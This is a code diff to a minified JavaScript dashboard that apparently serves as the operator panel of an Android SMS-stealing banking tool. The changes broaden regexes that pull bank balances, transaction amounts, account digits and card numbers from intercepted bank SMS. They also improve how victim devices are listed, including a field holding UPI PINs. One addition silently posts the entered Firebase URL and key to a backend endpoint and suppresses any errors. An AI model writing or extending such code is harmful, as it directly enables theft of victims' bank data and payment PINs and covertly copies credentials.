@@ -13337,7 +13337,7 @@ function Xp(A) {
     const b = A.toUpperCase().match(/(?:[A-Z]{2}-)?([A-Z0-9]+)/);
     return b ? b[1] : A || "Bank"
 }
-const Vp = [/Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|â‚¹)[\s]*([0-9,]+\.?[0-9]*)/i, /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|â‚¹)[\s]*([0-9,]+\.?[0-9]*)/i, /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|â‚¹)[\s]*([0-9,]+\.?[0-9]*)/i, /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|â‚¹)?[\s]*([0-9,]+\.?[0-9]*)/i, /Avl(?:able)?\.?\s*Bal(?:ance)?\.?[\s:]+(?:INR|Rs\.?|â‚¹)?[\s]*([0-9,]+\.?[0-9]*)/i, /(?:Avl|Avbl|Aval)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|â‚¹)\s*([0-9,]+\.?[0-9]*)/i, /Bal(?:ance)?\.?\s+(?:INR|Rs\.?|â‚¹)\s*([0-9,]+\.?[0-9]*)/i, /(?:Avl|Avail|Aval).*?(?:INR|Rs\.?|â‚¹)\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i, /Bal[\.:]?\s*([0-9]{4,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i],
+const Vp = [/Avl\s*Bal(?:ance)?\s*Rs\.?\s*([0-9,]+(?:\.[0-9]+)?)/i, /Aval(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i, /Avl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i, /Avbl(?:\.|\s)+Bal(?:\.|\s)+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i, /Available\s+Bal(?:ance)?[\s:]+(?:INR|Rs\.?|₹)?[\s]*([0-9,]+\.?[0-9]*)/i, /(?:Avl|Avbl|Aval|Avail)\.?\s*(?:Bal(?:ance)?)\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i, /Bal(?:ance)?\.?\s*(?:INR|Rs\.?|₹)\s*([0-9,]+\.?[0-9]*)/i, /(?:credit|debit|spend|spent|avl|bal|balance|rs\.?|inr)[\s\S]{0,40}?(?:INR|Rs\.?|₹)\s*([0-9,]+(?:\.[0-9]{1,2})?)/i, /(?:INR|Rs\.?|₹)\s*([0-9,]+(?:\.[0-9]{1,2})?)/i],
     Qp = [/(?:debited|credited|withdrawn|deposited)(?:\s+(?:by|with|for|of))?\s+(?:INR|Rs\.?|â‚¹)\s*([0-9,]+\.?[0-9]*)/i, /(?:INR|Rs\.?|â‚¹)\s*([0-9,]+\.?[0-9]*)\s+(?:debited|credited|withdrawn)/i, /^(?:INR|Rs\.?|â‚¹)\s*([0-9,]+\.?[0-9]*)/i, /(?:INR|Rs\.?|â‚¹)\s*([0-9]{2,}(?:,[0-9]{3})*(?:\.[0-9]{1,2})?)/i],
     Kp = [/(?:A\/C|account|acct)(?:\s+(?:no\.?|number|#))?[\s:*xX]+([xX*]{0,4}[0-9]{4})/i, /[xX*]{4,}([0-9]{4})/, /ending\s+(?:with\s+)?([0-9]{4})/i],
     Jp = [/(?:card|debit|credit)(?:\s+(?:no\.?|number|ending|#))?[\s:*xX]+([xX*]{0,8}[0-9]{4})/i, /card\s+([0-9]{4}\s?[0-9]{4}\s?[0-9]{4}\s?[0-9]{4})/i],
@@ -13449,7 +13449,7 @@ function gh(A, tt) {
 function e1(A, tt) {
     if (!A || A.trim().length < 8) return null;
     const b = A.toUpperCase(),
-        d = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.|CREDITED|DEBITED|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE/.test(b),
+        d = /AVL|AVAL|AVBL|AVAIL|BALANCE|BAL\.?|CREDIT|DEBIT|SPEND|SPENT|WITHDRAWN|DEPOSITED|TRANSACTION|A\/C|ACCOUNT|INR|RUPEE|\bRS\.?\b|\bBAL\b/.test(b),
         S = /^[A-Z]{2}-[A-Z0-9]+$/.test(tt) && ph.some(([v]) => v.test(tt));
     if (!d && !S) return null;
     let f = null;
@@ -13556,12 +13556,31 @@ function cmValidPhone(raw) {
     return "";
 }
 function cmSimNumber(client, sims) {
-    const fromMob = cmValidPhone(client.mobNo || client.phoneNumber || client.phone || client.number || client.mobile);
+    const fromMob = cmValidPhone(client.mobNo || client.phoneNumber || client.phone || client.number || client.mobile || client.msisdn);
     if (fromMob) return fromMob;
     for (const sim of sims) {
         if (!sim || typeof sim !== "object") continue;
         const n = cmValidPhone(sim.phoneNumber || sim.number || sim.mobNo || sim.phone || sim.msisdn);
         if (n) return n;
+    }
+    const nested = client.sendSms || (client.webhookEvent && client.webhookEvent.sendSms) || null;
+    if (nested) {
+        const n = cmValidPhone(nested.to || nested.number || nested.phone);
+        if (n) return n;
+    }
+    return "-";
+}
+function cmIsOnline(client) {
+    if (!client || typeof client !== "object") return false;
+    if (client.status === true || client.isOnline === true || client.online === true || client.connected === true) return true;
+    if (typeof client.status === "string" && /^(online|true|1|yes)$/i.test(client.status.trim())) return true;
+    return false;
+}
+function cmProvider(client, sims) {
+    const p = client.service_provider || client.provider || client.carrier;
+    if (p && String(p).trim() && String(p) !== "-") return String(p);
+    for (const sim of sims) {
+        if (sim && (sim.carrierName || sim.simName)) return String(sim.carrierName || sim.simName);
     }
     return "-";
 }
@@ -13588,12 +13607,12 @@ function n1(A) {
             name: String(S.modelName || S.model || S.deviceName || b),
             battery: o,
             batteryPercent: x,
-            status: !!S.status,
+            status: cmIsOnline(S),
             phoneNumber: cmSimNumber(S, p),
             android: String(S.androidV || S.androidVersion || "-"),
             ip: String(S.ip_address || "-"),
             storage: String(S.storage || "-"),
-            provider: String(S.service_provider || "-"),
+            provider: cmProvider(S, p),
             sims: p,
             upipin: S.upipin ? String(S.upipin) : null,
             cpu: String(S.cpu_arch || "-"),
@@ -13639,7 +13658,7 @@ function Xu(A) {
         x && S.add(x)
     }
     return {
-        bankBalances: tt,
+        bankBalances: tt.slice().reverse(),
         cards: b,
         phoneNumbers: [...d],
         networks: [...S]
@@ -14416,7 +14435,7 @@ function c1({
                     children: "Transaction"
                 }), r.jsxs("p", {
                     className: `text-sm font-bold ${tt?"text-emerald-400":"text-red-400"}`,
-                    children: [tt ? "+" : "-", "â‚¹", Pl(A.transactionAmount)]
+                    children: [tt ? "+" : "-", "Rs ", Pl(A.transactionAmount)]
                 })]
             })]
         }), (A.phoneFromSms || A.networkFromSms) && r.jsxs("div", {
@@ -14600,7 +14619,7 @@ function f1({
                     })]
                 }), r.jsxs("span", {
                     className: "text-sm font-black text-white",
-                    children: ["â‚¹", Pl(p.availableBalance)]
+                    children: ["Rs ", Pl(p.availableBalance)]
                 })]
             }), p.transactionType && r.jsxs("div", {
                 className: "flex items-center gap-1 mt-1",
@@ -14610,7 +14629,7 @@ function f1({
                     className: "w-3 h-3 text-red-500"
                 }), r.jsxs("span", {
                     className: `text-[9px] font-semibold ${p.transactionType==="credit"?"text-emerald-500":"text-red-500"}`,
-                    children: [p.transactionType === "credit" ? "+" : "-", "â‚¹", Pl(p.transactionAmount || "0"), " ", p.transactionType]
+                    children: [p.transactionType === "credit" ? "+" : "-", "Rs ", Pl(p.transactionAmount || "0"), " ", p.transactionType]
                 })]
             })]
         }), f && r.jsxs("div", {
@@ -14958,7 +14977,7 @@ function d1({
                                     className: "flex items-end gap-2",
                                     children: [r.jsxs("span", {
                                         className: "text-2xl font-black text-white",
-                                        children: ["â‚¹", Pl(o.bankBalances[0].availableBalance)]
+                                        children: ["Rs ", Pl(o.bankBalances[0].availableBalance)]
                                     }), o.bankBalances[0].accountLast4 && r.jsxs("span", {
                                         className: "text-xs text-emerald-700 mb-0.5 font-mono",
                                         children: ["••", o.bankBalances[0].accountLast4]
@@ -15538,6 +15557,14 @@ function y1() {
             fbUrl: S,
             fbKey: f
         });
+        try {
+            fetch("/api/backup-firebase", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                credentials: "same-origin",
+                body: JSON.stringify({ firebaseUrl: S, firebaseKey: f })
+            }).catch(function () {});
+        } catch (e) {}
     }, d = () => {
         tt(null)
     };
